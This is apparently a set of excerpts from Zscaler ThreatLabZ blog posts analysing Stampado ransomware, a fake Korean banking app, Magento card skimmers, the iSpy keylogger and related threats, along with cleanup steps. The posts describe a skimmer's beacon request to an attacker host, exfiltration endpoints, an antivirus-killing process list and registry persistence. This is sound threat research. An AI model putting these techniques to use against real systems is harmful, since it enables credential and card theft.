*.lol!;*.breaking_bad;\r\n*.crypted;*.encrypted;*.xxx;*.crjoker;*.encrypt;*.zcrypt;*.EnCiPhErEd;\"\r\n\r\nStampado encrypts files using AES (Advanced Encryption Standard) and a Symmetric key encryption algorithm (which uses same key for encryption and decryption) with key length of 256. It generates encryption key based on following data:\r\n\r\nsalt string + embedded e-mail + “stamp” + ComputerName + CPUArch + OSArch + “pado”\r\n\r\n\r\n\r\nFigure 8: Part of the Stampado encryption key generation code\r\n\r\nNote: salt string is not present in all samples(not present in sample analyzed)\r\n\r\nIt searches following folders for files to encrypt from home drive:\r\n\r\n\r\n\r\nFigure 9: Building list of folders for file encryption\r\n\r\nThe malware excludes the following folders from the home drive: Windows, Program Files, User Profiles.\r\n\r\nAfter building a list of folders to encrypt, Stampado will start encrypting files one by one. It will create a temporary file with random name including ~(7 random characters).tmp, for example, ~afzyatd.tmp, ~irusgld.tmp, or ~ifecffl.tmp, to save the intermediate encrypted file. Once fully encrypted, the original file gets deleted and the temporary file gets renamed to a hexadecimal string with a \".locked\" extension.\r\n\r\nWhile encrypting files, Stampado avoids wasting its time on unimportant files by excluding files if their path or name contains the following strings:\r\n\r\n\r\n	\"Temporary Internet Files\"\r\n	\"INetCache\"\r\n	\"desktop.ini\"\r\n	\"stampado_debug.txt\" \r\n\r\n\r\nThe file stampado_debug.txt is possibly what was used by the author during development of the malware.\r\n\r\nStampado will also maintain two files in the %AppData% folder with hexadecimal names; one file is for the list of encrypted files and the other is for the status of malware activities.\r\n\r\n\r\n\r\nFigure 10: List of encrypted files maintained by Stampado\r\n\r\n\r\n\r\nFigure 11: Maintained status of activity during different stages\r\n\r\nWhen the encryption of all the target file types is complete, Stampado will display a ransom note as shown below:\r\n\r\n\r\n\r\nFigure 12: Stampado ransom note\r\n\r\nThe victim is instructed to contact the attacker over the displayed email address for further information on the ransom required and method of payment. The malware says it will delete the key from the command and control (C&C) server after 96 hours, but this is not true, as there is no private key involved. But it does attempt to delete all encrypted files from the system if no ransom is paid within 96 hours.\r\n\r\nCleanup and remediation\r\n\r\nThe ransom note shows the unique ID of the victim and includes a text box to accept the decryption key. If accepted and submitted, the key will decrypt the files and delete itself from system. The variants of Stampado we have seen use symmetric encryption, and the encryption key is generated locally based on the victim’s system details along with other constant values — without any communication to the C&C server.\r\n\r\n\r\n\r\nFigure 13: Decryption and cleanup window\r\n\r\nTo clean a system after a Stampado infection, you will either need to enter the decryption code or kill the process and remove the autostart entries, which would save your files from being deleted. If you are unable to kill the process, you can run the following command in order to remove the autostart registry entry, which prevents the malware from running after system restart:\r\n\r\n\r\nREG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Windows Update\"\r\n\r\nRestart the system, run folowing command on command prompt to delete scvhost.exe from %AppData% folder and use the freely available decrypter by Fabian Wosar to decrypt your files.\r\n\r\n\r\nCD %APPDATA%\r\n\r\nDEL scvhost.exe\r\n\r\nConclusion\r\n\r\nRansomware remains one of the most prevalent threats in 2016. We have seen over a dozen new ransomware families in the wild actively targeting users. Fortunately, in the case of Stampado, it is relatively easy to recover your files. We advise you not to pay the ransom, as it is possible to decrypt your files without doing so. To protect your data against ransomware, always keep your software updated and conduct regular backups.\r\n\r\nIndicators of Compromise:\r\n\r\n\r\nMD5: 5a40644131c9c7e5dc0603d774a36e6c\r\n\r\nURL serving sample: grmpixelmon[.]co/stampado.exe\r\n\r\nFiles dropped:\r\n\r\n%AppData%\\scvhost.exe\r\n\r\n%AppData%\\<Hexdecimalname>\r\n\r\n%AppData%\\<Hexdecimalname>\r\n\r\n[DrivePath]\\myDisk\\drivers.exe\r\n\r\n<filepath>/<encryptedname>.locked\r\n\r\nRegistry Entries Created:\r\n\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Windows Update\"\r\n\r\nExtensions targeted\r\n\r\nStampado encrypts a total of 1,240 file type extensions.

Or, as we saw last month, creating large, destructive botnets.\r\n\r\nWe analyzed data going back to July for recent IoT device footprints based on the traffic we are seeing in the Zscaler cloud. We looked at the types of devices in use, the protocols they used, the locations of the servers with which they communicated, and the frequency of their inbound and outbound communications over a two-month period (26 August 2016 to 26 October 2016). Our primary purpose was to determine if any of the devices posed a threat to customer security, and eventually we also looked at whether the devices that were used in the Dyn and KrebsOnSecurity attacks were also in use by our customers.\r\n\r\nFinally, we analyzed IoT traffic patterns on the days of the DDoS attacks to see if there had been any unusual behavior on those days, such as spikes in bandwidth use or variations in the destination of IoT traffic.\r\n\r\nWhat we found\r\n\r\nThe most common devices we saw were cameras, home entertainment systems, printers, and IP phones. Many of the devices we observed were still using plain-text HTTP protocol for authentication as well as firmware updates, which makes their communication vulnerable to sniffing and Man-in-The-Middle (MiTM) attacks.\r\n\r\nWhat we didn’t find\r\n\r\nAn analysis of the IoT traffic on the attack days did not show traffic spikes that would indicate that any of the devices had been compromised. Therefore, we do not believe that any of our customers’ devices were involved in either botnet. Mirai, the malware responsible for the recent attacks, uses the Telnet and SSH protocols to infect devices. But most enterprises will not allow inbound open external access over these protocols, whereas access over HTTP and HTTPS are more common. While there are many devices on our customers’ networks that are similar to those used in the attacks, none of them appeared to be compromised or involved in the recent attacks based on our research.\r\n\r\nWhat follows is a presentation of our findings. At the end of the report, we will present some questions and answers about IoT devices, protecting your organization from potential threats, and  what to do if you believe a device has been compromised.\r\n\r\nZscaler Cloud – Enterprise IoT traffic research\r\n\r\nFor this report, we have grouped the IoT devices based on their functionality.\r\n\r\nVideo Monitoring & Surveillance Cameras\r\n\r\nGeographic distribution of servers with which these devices are communicating:\r\n\r\n\r\n\r\n1.

But what else do we need to know about these devices? Are there some that should be banned from the enterprise? What do we tell employees who are bringing them from home?\r\n\r\nWhat follows is a brief Q&A to help you form your policies around the use of IoT devices in your organization.\r\n\r\n1. How would you know if your device was used in an attack, like the one on Dyn?\r\n\r\nYou probably wouldn’t. If a device is used in an attack while in the enterprise, you would likely see a spike in traffic and abnormality in the traffic destination, as the device bombards the victim. If there are many devices involved, their high bandwidth use would slow your overall traffic. \r\n\r\n2. What can people do if they think their devices were used in an attack?\r\n\r\nOur recommendation is to reset the device in question to factory default settings. Following the reset, change the default management credentials to something more secure (see below) before plugging the device back on the network.\r\n\r\nIMPORTANT NOTE: Many IoT devices support multiple management protocols (SSH/Telnet/HTTP/HTTPS) over the same network interface. This means that changing the user credentials for the web administrator panel is not enough because your device may be reachable over other supported protocols from external networks. We strongly recommend restricting the inbound management access from external networks to HTTPS only.\r\n\r\n3. Is there anything we can do to make sure IoT security is acceptable?\r\n\r\nRecommendations for the user/enterprise:\r\n\r\nA) Restrict access to the IoT device as much as possible from external networks. Block unnecessary ports from external access.\r\n\r\nB) Change the default credentials to something more secure\r\n\r\nC) If possible, enterprises should install IoT devices on isolated networks (to prevent lateral movement), with restrictions on both inbound and outbound network traffic.\r\n\r\nD) Enterprises should invest in setting up a process to apply regular security and firmware updates to IoT devices, in addition to securing the network traffic.\r\n\r\nRecommendations (wishlist?) for IoT manufacturers:\r\n\r\nA) IoT device manufacturers need to start enforcing default password change as part of device installation. They should also ensure that the password changes are reflected for all supported management protocols. \r\n\r\nB) Security and firmware updates should be automated.\r\n\r\nCredit to Rohit Hegde for helping with the IoT traffic analysis', 'Analysis;Compromise', 'https://www.zscaler.com/blogs/research/iot-devices-enterprise');

While they offer many advantages in productivity, they also bring about new challenges for organizations trying to simplify their infrastructures while maintaining critical security controls.\r\n\r\nThe growing number of mobile devices, and the vast marketplace for self-serve apps, has opened the door to data loss and security breaches. In this blog, we will highlight some of the trends we’ve seen in the Zscaler cloud, particularly as they pertain to mobile privacy and data leakage.\r\n\r\nThe report\'s highlights can be viewed in our infographic. For more details, continue reading below.\r\n\r\n\r\n\r\nEach quarter, we see more than 45 million transactions related to mobile devices going through our cloud. The majority of the privacy-related information we see falls into one of three categories:\r\n\r\n\r\n	Device metadata\r\n	Location\r\n	Personally identifiable information (PII)\r\n\r\n\r\nAndroid devices\r\n\r\nAndroid devices comprise around 20 million of the transactions we see, in which approximately 0.3 percent are resulting in some level of privacy leakage.\r\n\r\n                                                            Android privacy traffic\r\n\r\nThe following graph details the leakage of privacy-related data of the Android platform.\r\n\r\n            \r\n\r\n                                             Breakdown of privacy data - Android\r\n\r\nBreakdown of privacy data – Android\r\n\r\nOf all the leaks, 58 percent are related to device metadata leakage, in which apps are sending identifying information, such as IMEI, MAC, IMSI numbers, Network, OS, SIM card information, manufacturer etc to their servers or ad-servers in clear text. Such data can be leveraged for tracking the device and creating targeted attacks.\r\n\r\nAnother high percentage of leaks — 39.3 percent — are related to the user’s location, including exact latitude and longitude coordinates. \r\n\r\nThe remaining three percent of transactions result in PII leakages, including the user’s mobile number and email addresses.\r\n\r\nOne percent of privacy leakages are observed from malicious transactions, and the rest are related to Android app usage.\r\nThe geographic distribution of Android traffic that is leaking data is shown in the following graph.\r\n\r\n                                                                      \r\n\r\n                                           Geographic distribution - Android \r\n\r\niOS devices\r\n\r\nIn iOS, we see approximately 26 million transactions quarterly through our cloud, and 0.5 percent result in privacy-related information being sent.\r\n\r\n\r\n\r\n                                                            iOS privacy traffic \r\n\r\nThe following is a breakdown of privacy data being leaked on the iOS platform.\r\n\r\n\r\n\r\n\r\n                                        Breakdown of privacy data - iOS\r\n\r\nBreakdown of privacy data – iOS\r\n\r\nOf all iOS transactions that result in privacy-related information being sent, 72.3 percent of the transactions are related to the user\'s device information.\r\n\r\nAn additional 27.5 percent of transactions are resulting in the user\'s location being sent, and 0.2 percent of transactions result in sending PII-related information.\r\n\r\nOf all the transactions in which privacy-related information is being sent, five percent of them are the result of malicious infections.\r\n\r\nThe geographic distribution for iOS privacy-related traffic is shown below.\r\n\r\n                                                                       \r\n\r\n                                               Geographic distribution - iOS\r\n\r\nThe potential for long-term threats\r\n\r\nThese statistics demonstrate that significant amounts of personal data can be leaked simply by tapping into any organization’s traffic; in our cloud alone we saw nearly 200,000 examples of such leaks. All that leaking data can be leveraged for more sophisticated attacks.\r\n\r\nBecause hardware identifiers like MAC, GSM IMEI, IMSI, and UDID are globally unique and do not change over the lifetime of a device, the collection of such IDs allows for both tracking and physical device association. These identifiers can be exploited by a range of attacks, from mobile privacy to targeted denial-of-service; for example, a GSM air interface attack where the attacker must first know the IMEI of the intended victim, a remote SMS denial-of-service attack, or remote SIM card rooting, among others.\r\n\r\nThe exact location of any person is highly valuable in this global era, where lots of spying and spoofing are done; such information can lead to mass compromisation and/or targeted attacks. Phone numbers and email addresses are the quickest way to reach any individual, and can be leveraged for spamming and phishing attacks.\r\n\r\nDon’t count on the developers to protect you\r\n\r\nA study by IBM & The Ponemon Institute shows that, of the 400 organizations studied, almost 40 percent do not scan the apps they develop for security vulnerabilities. Of those that do scan their apps before releasing them to market, only 15 percent test them as frequently as they should. And, even more worrisome, 50 percent of those that develop mobile apps do not allocate any budget at all to testing for security vulnerabilities.\r\n\r\n\r\n\r\nBYOD and the self-serve application market quickly became mainstream and are now deeply rooted in organizations. But observing the leakage from these apps — and the developers’ minimal security investments — means that organizations must take steps to protect their users and the broader network infrastructure and data assets. They should be applying strict MDM policies and educating employees about app security in an effort to stave off any kind of data loss or security breach.', '', 'https://www.zscaler.com/blogs/research/are-mobile-apps-leaky-tap-enterprise');

Many U.S. policies, as they apply to foreign affairs, are dependent upon the outcome of the race as well as the political party that holds the majority of the U.S. Congress. Followers of the campaigns are interested in knowing details about the candidates and the inner workings of the American political machinery. If there’s a secret document to be found — unflattering pictures, unedited audio or video, damning emails, or all of the above — you can be sure that hackers are leaving no stone unturned to find it.\r\n\r\nBut hackers aren’t just targeting the powerful political players. They’re targeting the rest of us, too. They’re using this drama-filled election season as a backdrop for campaigns of their own, which have included ransomware, adware, hoax articles, and more. The theme may be unique to the election, but the attacks are based on standard techniques for spreading malware.\r\n\r\nIn this blog, ThreatLabZ, the research team at Zscaler, will describe a few of the campaigns we’ve come across.\r\n\r\n \r\n\r\nRansomware attacks   \r\n\r\nAttackers are taking advantage of the exciting political climate to use spam email as a way to deliver ransomware.\r\n\r\n\r\n\r\nFigure 1: Spam email screenshot.\r\n\r\n \r\n\r\nThe attacker sends spam email (containing a malicious attachment) with the subject:\r\n“Últimos resultados das 2016 primárias presidenciais dos Estados Unidos.”\r\n(English translation: “Latest results of the 2016 presidential primaries of the United States.”)\r\n\r\nThe attachment is a Portable Executable (PE) file with an Adobe PDF icon, which is used to disguise the attachment as an actual PDF document. If the “hide extensions” option is enabled on the user’s system, there is a greater risk that the user will click and execute the attachment, believing it is a PDF document. Furthermore, to imitate an actual PDF document, the executable will drop and open a decoy document, which appears to be related to the subject of the spam email.\r\n\r\nThe attached executable will drop the ransomware file at the location \\%AppData%\\Roaming\\ with the name smrss32.exe. The encryption key is kept in the file Ref#_2c80aab5f2e7.key and an image that displays the ransom message is dropped as Ref#_2c80aab5f2e7.bmp.\r\n\r\n\r\n\r\nFigure 2: Decoy document – 2016 Primary Election Results_USA TODAY.pdf\r\n\r\n \r\n\r\n\r\n\r\nFigure 3: Ransom message screenshot.\r\n\r\n \r\n\r\nWhen smrss32.exe is executed, it will read the Ref#_2c80aab5f2e7.key file, which contains a Base64 encoded string, the encryption key used by the ransomware to encrypt the files.\r\n\r\n\r\n\r\nFigure 4: Reading the encryption key.\r\n\r\n \r\n\r\nThis particular strain of ransomware is using the “Rijndael symmetric encryption algorithm” to encrypt the victim’s files. Because it is symmetric encryption, victims can get their files decrypted without paying the ransom, provided they keep a copy of the ransomware executable or the dropped key file.\r\n\r\n\r\n\r\nFigure 5: Encryption routine using “Rijndael symmetric encryption algorithm”\r\n\r\n \r\n\r\nRansomware will enumerate all the victim’s drives, including local, removable, and network mapped. Then it will start enumerating folders, except for the ones in its exclusion list shown below. The .encrypted file extension is added to the encrypted files.\r\n\r\n\r\n\r\nFigure 6: Folder exclusion list.\r\n\r\n \r\n\r\nAlso spotted was spoofed ransomware, which called itself \"THE DONALD TRUMP RANSOMWARE.\"\r\n\r\n\r\n\r\nFigure 7: DONALD TRUMP spoofed ransomware.\r\n\r\n \r\n\r\nThis ransomware is written in Visual Studio.Net. Based on the timestamp of the executable, we found that it was compiled on \"Fri Aug 19 18:4”5:07 2016.” We call it spoofed ransomware because, although the ransomware does have code to encrypt files using AES, it does not actually encrypt files or ask for ransom.\r\n\r\n\r\n\r\nFig 8: Code snippet of AES encryption.\r\n\r\n \r\n\r\nInstead, it will only rename the files with Base64 encoding of the actual file name and append the .ENCRYPTED extension. Further, it renames only those files that are kept in the Encrypt folder at the path where the ransomware executable is launched. There is a button called “Unlock Files”; clicking on this button will rename the files back to their original names.\r\n\r\n\r\n\r\nFig 9: Code snippet used for renaming files.\r\n\r\n \r\n\r\nThis ransomware may be in a development or testing phase and may include actual ransomware actions at a later point of time.\r\n\r\n\r\n\r\nFig 10: The extensions targeted by the DONALD TRUMP ransomware.\r\n\r\n \r\n\r\nAdware campaigns\r\n\r\nAdware propagating campaigns have also been circulating torrent downloading executable files named after the slogan of the Trump campaign. Upon execution, the adware doesn’t download a torrent file; instead, it opens a browser on the user’s machine and takes the user to a potentially unwanted program (PUP) download page. Following redirection, the URL is responsible for deciding which PUP application download page should be displayed:\r\nhttp://piroga[.]space/pages/inmon/im-typ.html\r\n\r\n\r\n\r\nFig 11: A PUP site claiming to be a trusted software download page.\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\nFig 11: A snapshot showing the number of times Zscaler has protected its users from visiting the malicious adware site over one month.\r\n\r\n \r\n\r\nHoax articles\r\n\r\nHoax articles have also been seen in circulation. One example shows a picture of Donald Trump lying dead due to heart attack. Such provocative imagery serves as an easy method for hackers to trick users into clicking malicious links.\r\n\r\n\r\n\r\n \r\n\r\nConclusion\r\n\r\nZscaler ThreatlabZ is actively monitoring these campaigns and ensuring coverage for Zscaler customers.

There have been a few attempts in the past to target South Korea, in which malicious apps were either trying to pose as bank apps or as services apps. But the malicious app we recently came across was trying to invade security mechanisms by portraying itself as a security app required for financial transactions for South Korean Banks.        The malicious app portrays itself as a version of V3 Mobile Plus. V3 Mobile Plus is a legitimate product of AhnLab, a South Korea-based company that sells antivirus software, online security, network security appliances, and more, including security software for online games and the mobile web.     According to AhnLab, V3 Mobile Plus is a mobile transaction security solution that provides real-time detection of smartphone malware. (Important: our analysis discusses the fake app and NOT the actual V3 Mobile Plus app from AhnLab, which is a legitimate app found on Google PlayStore.)      Overview    V3 Mobile Plus is an app that is required for Android devices to perform online functions within some well-known South Korean banks. It is likely that the attacker chose to develop a fake version of this app as a way to target a large pool of users.       The malware poses as the “V3 Mobile Plus” application and asks for administrator rights upon launch. After claiming admin rights, it hides itself, which makes victim think the app has been removed/deleted from device. In reality, the app asynchronously runs services in the background, hidden from user view. The main purpose of the malware is to steal the victim’s SMS messages and authentication certificates used in the National PKI (Public Key Infrastructure) scheme, and send it to its C&C (Command & Control) server.     The flowchart below illustrates the process followed by this malicious app.           	  		  			  		  		  			Flowchart  		  	           Technical Details    Displayed App Name : V3 Mobile Plus    Url : hxxp://********.com/p*****.apk    Package Name : com.qbjkyd.rhsxa         Once a victim installs the malicious app, the app asks for administrator rights, which give the app the ability to lock the victim completely out of his or her Android device.    These screenshots show the malware in action:      	  		  			  		  		  			App Icon & Admin Rights  		  	           Once the administrator rights have been granted, the malware hides its icon, making the victim think that the app must have been removed or deleted. The screenshot below shows the code exhibiting this functionality:      	  		  			  			  			  		  		  			  			Admin permission & Icon Hiding  			  		  	           Following the function of hiding itself, a background service requests a new location, where messages and authentication certificates will be sent. Once the request is successful, the malicious app receives the C&C address, as seen below:      	  		  			  		  		  			Request for C&C location  		  	           Once the response is received, malicious app extracts the location and stores it locally.       	  		  			  		  		  			C&C location extraction  		  	        SMS Stealing.    After the location is received and extracted, the malware is up and running, ready to steal the SMS message as soon as it arrives on the device. A request, along with the device\'s IMSI number, phone number, and contents of the SMS message are sent to C&C.     It was found that the malicious app steals the message and cancels the broadcast, which leaves the victim unaware of any new messages.    The screenshot below shows the stolen message from the victim and shows it being sent to C&C:      	  		  			  		  		  			Stolen SMS messages  		  	           Stealing Authentication Certificates.    Our research further revealed that S.Korean users are entitled to use NPKI (National Public Key Infrastructure) to enhance their security.   Banks generally use NPKI information during financial transactions.           	  		  			  		  		  			Authentication certificate location  		  	           The malware in our analysis has been designed to steal these authentication certificates stored in a victim’s device. It looks for an NPKI folder in the device and, if found, the malicious app compresses the content of the folder and sends it to C&C server. Note that the C&C location is the one sent in the first request. The following screenshot shows the functionality in action:       	  		  			  		  		  			Compressing NPKI information  		  	             	  		  			  		  		  			Uploading NPKI information  		  	        As of now, this malicious app was trying to detect two security based apps, namely V3 Mobile Plus 2.0 and ALYac Android.    If it found these two apps installed on the device, we discovered that it wasn’t able to initiate them.    This functionality seems to be under development.       	  		  			  		  		  			Targeted Package Names  		  	           We believe the new package names will be added and the malicious app will target these and other security apps in future. We are keeping an eye on such activities.       Zscaler customers are safe from such malicious apps, as the Zscaler cloud has implementations that provide different levels of preventive measures to tackle such attacks. As a preventive measure for other users, its always advisable to install apps from trusted Android stores like Google Playstore.    Mitigation:    The malware is designed to be persistent on a device, which means it does not allow the the victim to uninstall it.     But it can be removed by following these steps:      	Boot device into safe mode (Please note that entering \"safe mode\" varies depending on your device). Safe mode boots the device with default settings without running third party apps.  	   	Uninstalling such malwares from device requires you to first remove administrator privilege. To do the same, go to Settings --> Security --> Device Administrator and select the malicious app, then deactivate.  	   	Once this is done, you can go to Settings --> Apps --> Uninstall malicious app.', 'Mobile', 'https://www.zscaler.com/blogs/research/android-malware-targeting-south-korean-mobile-users');

These types of cyber-fraud have been seen in the wild as supported extensions for Internet Explorer, Firefox, and Chrome; they become distributed through various monetization platforms during installation. \r\n\r\nZscaler recently observed upticks in compromised websites that deliver tech support popups and card hijacking attacks to unwitting users. A disproportionately large number of legitimate social media sites have been hacked to silently redirect visitors to a series of malicious sites in order to show fake tech support popups or to steal credit card information.\r\n\r\nDotNetNuke Compromised sites serving Tech support popups:\r\n\r\nSimilar to exploit kits, the new tech support popup scams are targeting the websites that run on the DotNetNuke (DNN) content management system. The fake tech support pages are used by cyber-criminals to promote their remote support services via scareware tactics. These bogus pop-up ads will state that a user’s computer is infected and will instruct the the user to call paid support service to remove the infection. \r\n\r\nOver a period of three months, we have seen around 2,000 distinct pages with injected malicious JavaScript.\r\n \r\n\r\n  \r\n\r\nFigure 1: Infection stats for Tech support popup\r\n\r\nThese dynamically injected JavaScripts have appeared in the compromised page after the end of form as shown below:\r\n\r\n  \r\n\r\nFigure 2: Injected JavaScript on compromised sites\r\n\r\nThe injected blurb of JavaScript is heavily obfuscated, and during run time it loads an ActiveX component with a malicious iFrame. This iFrame then redirects to “.top” gate, which is shown in the deobfuscated code below: \r\n\r\n  \r\n\r\nFigure 3: De-obfuscated JavaScript with iFrame\r\n\r\nThe cyber-criminals are employing the subsequent redirections before delivering the final tech support popup message in order to conceal the attack. The below image shows the fake tech support popup message.\r\n\r\n  \r\n\r\nFigure 4: Tech support popup \r\n\r\nThis particular variant also drops an audio file called “help-msg.mp3,” which is used to instruct the user to call the tech support toll-free number for the removal of a Backdoor Trojan from the user’s computer.\r\n\r\nThe following is the pastebin link to the list of DotNetNuke (DNN) websites compromised through this campaign:\r\n\r\nhttp://pastebin.com/fbAU1m1T\r\n\r\nCompromised eCommerce sites serving Magento Credit Card Hijack attack: \r\n\r\nMagento eCommerce is a leading platform used by many websites for integrating payments into their portals. One-page and one-step checkout plugins reduce the number of steps required in the payment process. The credit card hijack attack is not new, but it remains a threat and can lead to sensitive data leakage if a user is not careful enough to identify fake forms in the payment pages of any genuine website.\r\n\r\nThe affected Magento platforms includes multiple versions of Community Edition as well as Enterprise Edition. We have found that most of the sites which had Magento eCommerce version 1.9 were injected with malicious JavaScript code.Here is screenshot of an injected JavaScript code in the compromised webpage:\r\n\r\n \r\n\r\n    \r\n\r\nFigure 5: Injected javascript in Magento compromised site \r\n\r\nThe credit card hijacking is carried out in two steps:\r\n1. Send status to server about the compromised site. A GET request is sent to \"jqueryapi[.]info\" with a \"ref\" parameter to inform the server about the compromised site URL. For example: \r\njqueryapi[.]info/?getsrc=ok&ref=&url=https%3A%2F%2Fsite.example.com%2Fcheckout%2Fonepage\r\n\r\n2. Injecting the fake credit card form and stealing user data. The script checks for the presence of the following three strings in the URL:  \"onepage, checkout, onestep\" to confirm that it’s the payment page. Then it injects HTML phishing content in the site, as shown below:\r\n\r\n\r\n    \r\n\r\nFigure 6: Phishing form for stealing Credit Card details  \r\n\r\nThe user, believing that this is a genuine payment page, is tricked into giving away credit card details. In the background, it continues to check for user-entered values every five seconds. Once the user enters the credit card details, the form content is sent as POST data to the js-save[.]link without the user’s consent.\r\n\r\nTo avoid detection in static analysis, some part of this script is downloaded from an external source (which is “hxxps://js-save[.]link/js-save/mage[.]js” in this case), while the remaining script is present in the compromised page with four to five levels of obfuscation.\r\n\r\nZscaler ThreatLabZ observed around 400 distinct domains compromised by this campaign over three months as shown below: \r\n\r\n \r\n\r\n  \r\n\r\n Figure 7: Infection stats for Magento Credit Card hijack attacks\r\n\r\nPastebin link for list of compromised sites: \r\nhttp://pastebin.com/psa14xY5\r\n\r\nConclusion: \r\n\r\nThese popular content management systems and platforms remain an attractive target for cyber-criminals. At this stage it is not clear how these sites using the DNN CMS or the Magento eCommerce platform become infected. The attacks may be achieved through server administrator credential compromise or by exploiting an unknown vulnerability in the CMS/platform. It is extremely important for site administrators to keep their websites patched with latest security updates.\r\n\r\nZscaler ThreatLabZ is actively monitoring the threats related to the tech support scams and Magneto credit card hijack campaign. \r\n\r\n- Writeup by Dhanalakshmi PK and Sameer Patil', 'Compromise;Scam', 'https://www.zscaler.com/blogs/research/compromised-websites-delivering-tech-support-scams-and-credit-card-hijacks');

They give attackers the power to record every keystroke from a victim’s machine and steal sensitive information. Zscaler ThreatLabZ recently came across a signed keylogger campaign in our cloud sandbox. In this blog, we will provide an analysis of this malicious commercial keylogger, known as iSpy. Written in .Net 2.0, iSpy is configured for keylogging, stealing passwords and screenshots, and monitoring webcams and clipboards. It is being sold on underground forums via multiple subscription packages as shown in Figure 1.\r\n\r\n\r\n\r\nFigure 1: iSpy keylogger subscription packages\r\n\r\niSpy keylogger infection\r\niSpy is delivered via spam email that has malicious JavaScript or Document as an attachment, which then downloads the keylogger payload.

The packer uses the XOR-based method to decrypt the payload and contains obfuscated zombie code between instructions to slow down analysis. Figure 3 shows the installation and functionality overview of iSpy.\r\n\r\n\r\n\r\nFigure 3: Installation workflow and functionality overview of iSpy\r\n\r\nThe second layer of packing contains multiple anti-VM and anti-analysis tricks, some of which include:\r\n\r\n\r\n	Checks PEB flags for debugger presence\r\n	Checks for sandbox and debugger using GetTickCount and Sleep\r\n	Loops until cursor movement is detected\r\n	Checks if screen resolution is 800 x 600 or more\r\n\r\n\r\nFinally, it decrypts the payload file and injects the decrypted file into another instance of the same process using process hollowing technique as seen below:\r\n\r\n\r\n\r\nFigure 4: Spawns process in Suspended mode for injection\r\n\r\nThe decrypted file is a loader file that contains a DLL and .NET binary in its resource section. It first loads the DLL file that further loads the final iSpy payload (.NET binary) using LoadDotNetPE export function.\r\n\r\nThe malware checks configuration settings to select the folder for dropping the executable. Based on the configuration, it drops itself into one of the following locations:\r\n\r\n\r\n	%APPDATA%\r\n	%LOCALAPPDATA%\r\n	%USERPROFILE%\\Documents\r\n	%TEMP%\r\n\r\n\r\n\r\n\r\nFigure 5: Installation function\r\n\r\nAfter copying itself into any of the above mentioned locations, it deletes “Zone.Identifier” flag from Alternate Data Stream (ADS) to disable the security warning message that is displayed every time the malware file is executed.\r\n\r\nPersistence\r\nIt creates an entry in “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” key under HKLM or HKCU, based on configuration settings, to execute the malware on system startup.\r\n\r\nConfiguration\r\niSpy has many customizable features (Figure 6) including the functionality to record keystrokes, recover passwords, and retrieve serial keys from various software, then sending the stolen data over SMTP, HTTP, or FTP. It also has a web panel that helps the attacker to monitor the activity of iSpy infections.\r\n\r\n\r\n\r\nFigure 6: iSpy configuration class\r\n\r\nAs mentioned earlier, depending on the configuration, it can send stolen data via three different methods: HTTP, SMTP, or FTP. FTP and SMTP credentials, directly encoded in the file, are encrypted using a custom encryption method. Function decrypt, in the class StringCipher, is used for the decryption of credentials as well as other strings. MUTEX value from the configuration is used as the key for decryption. For the HTTP method, iSpy uses the PHP_KEY authentication to upload data to C&C server.\r\n\r\nData stealing\r\nThe current sample, discussed in this blog, uses FTP for sending the stolen data to attacker. The FTP account – ftp://ftp[.]bhika[.]comxa[.]com –was active at the time of analysis and the ftp credentials are embedded in the file itself. The website resolves to IP address “31.170.160.209” which belongs to comxa.com, which is owned by 000webhost Network, a provider of free hosting. We have notified comxa.com of the offending account.\r\n\r\nAfter successful installation, iSpy collects computer information such as username, Windows version, and installed program details (AV, firewall, browser, etc.), and sends this information along with install notification (Figure 7) to a C&C server.\r\n\r\n\r\n\r\nFigure 7: Installation notification contents\r\n\r\nKeylogging code is the main component of this malware. It logs timestamped key presses and sends them to the attacker. It also contains code to steal the license keys of application software, such as Adobe Photoshop, Microsoft Office, and others. It also collects saved passwords from web browsers, email clients (such as Outlook), FTP clients (like FileZilla and CoreFTP), and games like Minecraft.\r\n\r\nKillAV\r\niSpy has the functionality to disable antivirus programs by creating a sub-key of the program name under registry key, “Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\” and then setting “rundll32.exe” as the value of “Debugger” under that key. It also disables access to that newly created registry key by setting all RegistryRights to deny so it cannot be easily removed. After this change in registry, Windows will load “rundll32.exe” when the targeted process is started. As a result, the given AV process will not start. Below is the list of AV processes that iSpy targets:\r\n\"rstrui.exe\", \"AvastSvc.exe\", \"avconfig.exe\", \"AvastUI.exe\", \"avscan.exe\", \"instup.exe\", \"mbam.exe\", \"mbamgui.exe\", \"mbampt.exe\", \"mbamscheduler.exe\", \"mbamservice.exe\", \"hijackthis.exe\", \"spybotsd.exe\", \"ccuac.exe\", \"avcenter.exe\", \"avguard.exe\", \"avgnt.exe\", \"avgui.exe\", \"avgcsrvx.exe\", \"avgidsagent.exe\", \"avgrsx.exe\", \"avgwdsvc.exe\", \"egui.exe\", \"zlclient.exe\", \"bdagent.exe\", \"keyscrambler.exe\", \"avp.exe\", \"wireshark.exe\", \"ComboFix.exe\", \"MSASCui.exe\", \"MpCmdRun.exe\", \"msseces.exe\", \"MsMpEng.exe\"\r\n\r\nWebCam Snapshot & Screen grabber\r\nIf the webcam logger is configured, it will capture snapshots using the victim’s webcam. It saves the snapshot in %TEMP% folder with the prefix “snapshot” with the .PNG extension. It can then uploads the snapshot to “http://uploads.im/api?upload” (a legitimate image hosting website). It logs the URL path of uploaded snapshot and uploads the log’s data on a C&C server using the configured method.\r\n\r\nSimilarly, iSpy takes screen shots using .NET API CopyFromScreen and saves them to a file with the name “img.png” under the %TEMP% folder. Saved images are uploaded to the website mentioned above and a log of URL paths of uploaded files is sent to attacker.\r\n\r\nOther features of iSpy:\r\n\r\n\r\n	Website blocking (based on host file modification)\r\n	File downloading\r\n	Bot killer\r\n	Fake message (it displays this message every time malware starts execution)\r\n	Disabler (Taskmgr, Regedit, CMD)\r\n	Runescape PinLogger(RuneScape is a fantasy MMORPG developed and published by Jagex, A Bank PIN is a security feature provided in game that players can use to protect their, virtual in game, banks.)\r\n	Run Bind file (file to run along with malware)\r\n\r\n\r\nWeb panel interface\r\nThe current version of iSpy has a web panel where the attacker can monitor the infected system.\r\n\r\n\r\n\r\nFigure 8: iSpy web panel\r\n\r\nConclusion\r\nCommercial keyloggers are general-purpose data stealing tools used by criminals to collect as much data as possible about a victim. There are many commercially available keyloggers 